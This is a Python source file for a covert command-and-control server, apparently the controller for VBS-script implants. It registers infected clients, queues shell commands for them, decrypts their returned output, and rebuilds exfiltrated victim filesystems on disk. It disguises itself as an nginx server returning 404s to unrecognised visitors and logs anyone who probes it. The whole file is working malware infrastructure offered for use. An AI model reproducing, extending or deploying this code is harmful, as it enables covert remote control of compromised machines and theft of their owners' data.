#!/usr/bin/env python3

import argparse
import socketserver
from threading import Thread
from cli import Cli
from client import Client
from subscriber import ServerSubscriber
from typing import List
import datetime
from utils.encrypt import encrypt_decrypt
from utils.exfiltrate import parse_exfiltrate_input, recreate_filesystem

parser = argparse.ArgumentParser()

parser.add_argument("-k", "--key", default=".*!")


PORT = 80


class Server:
    clients = []
    subscribers: List[ServerSubscriber] = []

    def __init__(self):
        self.server = socketserver.TCPServer(("0.0.0.0", PORT), CmdHttpHandler)
        self.encryption_key = ".*!*!."

    def start(self):
        self.server.serve_forever()

    def set_encryption_key(self, key: str):
        self.encryption_key = key

    def register_subscriber(self, subscriber: ServerSubscriber):
        self.subscribers.append(subscriber)

    def get_client(self, ip_or_friendly_name: str):
        client = None
        for c in self.clients:
            if c.ip.upper() == ip_or_friendly_name.upper() or c.friendly_name.upper() == ip_or_friendly_name.upper():
                client = c
                break
        return client

    def set_client_command(self, ip_or_friendly_name: str, cmd: str):
        client = self.get_client(ip_or_friendly_name)
        client.set_cmd(cmd)

    def register_client(self, ip: str) -> Client:
        client = Client(ip, self.encryption_key)
        self.clients.append(client)
        for s in self.subscribers:
            s.on_client_register(client)
        return client

    def cmd_output(self, client: Client, output: str):
        for s in self.subscribers:
            s.on_client_cmd_output(client, output)

    def exfiltration(self, client: Client, output: str):
        for s in self.subscribers:
            s.on_client_exfiltration(client)
        items = parse_exfiltrate_input(output)
        recreate_filesystem(
            f"client_data/{client.ip}_{client.friendly_name}", items)


class CmdHttpHandler(socketserver.BaseRequestHandler):

    innocent_response = (b"HTTP/1.1 404\nServer: nginx\ncontent-length: 0\n\n")

    def handle(self):
        client_ip, _ = self.client_address
        one_mb = (2**18)*4
        try:
            # Read 512MB
            encoded_data = self.request.recv(one_mb*512).strip()
        except Exception as e:
            print("Error while reading HTTP input")
            print(e)
            return
        self.data: str = encoded_data.decode("UTF-8")

        if len(self.data) == 0:
            return

        elif "REGISTER_VBS" in self.data:
            client = server.register_client(client_ip)
            res = client.friendly_name.encode("UTF-8")
            response = (b"HTTP/1.1 200\nServer: nginx\ncontent-length: "
                        + str(len(res)).encode("UTF-8")
                        + b"\r\n\r\n"
                        + res)
            self.request.sendall(response)

        elif self.data.splitlines()[0].startswith("GET") and "VBSSIGNATURE" in self.data:
            friendly_name: str = self.data.split("VBSSIGNATURE")[
                1].split(":")[1]
            client: Client = server.get_client(friendly_name)
            if client is None:
                response = self.innocent_response
                self.request.sendall(response)
                with open("investigations.txt", "a") as f:
                    f.write(
                        f"[{datetime.datetime.now().isoformat()}]{client_ip}:\n{self.data}\n------------------")
                return

            command = client.read_cmd_and_clear().encode('UTF-8')

            response = (b"HTTP/1.1 200\nServer: nginx\ncontent-length: "
                        + str(len(command)).encode("UTF-8")
                        + b"\r\n\r\n"
                        + command)

            self.request.sendall(response)

        elif self.data.splitlines()[0].startswith("POST") and "VBSSIGNATURE" in self.data:
            body = "".join(self.data.split("\r\n\r\n")[1:])

            friendly_name: str = self.data.split("VBSSIGNATURE")[
                1].split(":")[1]

            client = server.get_client(friendly_name)

            if client is None:
                response = self.innocent_response
                self.request.sendall(response)
                with open("investigations.txt", "a") as f:
                    f.write(
                        f"[{datetime.datetime.now().isoformat()}]{client_ip}:\n{self.data}\n------------------")
                return
            output: str = "".join(body.split("VBSSIGNATURE")[1].split(":")[2:])
            decrypted_output = encrypt_decrypt(output, ".*!")
            if len(output) > 0:
                if "EXF~t~" in decrypted_output:
                    server.exfiltration(client, decrypted_output)
                else:
                    server.cmd_output(client, decrypted_output)

            response = (
                b"HTTP/1.1 200\nServer: nginx\ncontent-length: 0\r\n\r\n")
            self.request.sendall(response)
            return

        else:
            response = self.innocent_response
            self.request.sendall(response)


server = Server()


def main():
    args = parser.parse_args()
    print("""
    
░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░  ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  
                                                                                                          
    """)
    print("To print available commands enter 'HELP'")
    print()
    server.set_encryption_key(args.key)
    cli = Cli(server)
    try:
        thread = Thread(target=cli.poll, daemon=True)
        thread.start()
        server.start()

    except KeyboardInterrupt:
        print("Bye!")


if __name__ == "__main__":
    main()
